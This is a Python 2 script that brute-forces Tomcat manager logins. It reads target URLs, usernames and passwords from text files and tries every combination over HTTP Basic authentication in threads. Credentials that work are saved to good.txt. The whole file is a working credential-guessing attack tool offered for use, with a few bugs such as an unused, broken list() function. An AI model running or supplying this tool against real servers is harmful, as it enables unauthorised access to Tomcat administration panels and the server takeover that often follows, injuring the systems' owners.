#!/usr/bin/env python 
# -*- coding: utf-8 -*-

import sys 
import requests 
import threading 
import Queue 
import time 
import base64 
import os

#headers = {'Content-Type': 'application/x-www-form-urlencoded','User-Agent': 'Googlebot/2.1 (+[url]http://www.googlebot.com/bot.html[/url])'} 
u=Queue.Queue() 
p=Queue.Queue() 
n=Queue.Queue() 
#def urllist()

urls=open('url.txt','r') 
def urllist(): 
    for url in urls: 
        url=url.rstrip() 
        u.put(url) 
def namelist(): 
    names=open('name.txt','r') 
    for name in names: 
        name=name.rstrip() 
        n.put(name) 
    
def passlist(): 
    passwds=open('pass.txt','r') 
    for passwd in passwds: 
        passwd=passwd.rstrip() 
        p.put(passwd) 
    
def weakpass(url): 
    namelist() 
    while not n.empty(): 
        name =n.get() 
        #print name 
        passlist() 
        while not p.empty(): 
            good() 
            #name = n.get() 
            passwd = p.get() 
            #print passwd 
            headers = {'Authorization': 'Basic %s==' % (base64.b64encode(name+':'+passwd))} 
            try: 
                r =requests.get(url,headers=headers,timeout=3) 
                #print r.status_code 
                if r.status_code==200: 
                    print '[turn] ' +url+' '+name+':'+passwd 
                    f = open('good.txt','a+') 
                    f.write(url+' '+name+':'+passwd+'\n') 
                    f.close() 
                else: 
                    print '[false] ' + url+' '+name+':'+passwd 
            except: 
                print '[false] '  + url+' '+name+':'+passwd 
    
def list(): 
    while u.empty(): 
        url = u.get() 
        weakpass(name,url) 
    
def thread(): 
    urllist() 
    tsk=[] 
    for i in open('url.txt').read().split('\n'): 
        i = i + '/manager/html' 
        t = threading.Thread(target=weakpass,args=(i,)) 
        tsk.append(t) 
    for t in tsk: 
        t.start() 
        t.join(1) 
        #print "current has %d threads" % (threading.activeCount() - 1) 
def good(): 
    good_ = 0 
    for i in open('good.txt').read().split('\n'): 
        good_+=1 
    os.system('title "weakpass------good:%s"' % (good_)) 
    
if __name__=="__main__": 
# alllist() 
    thread() 
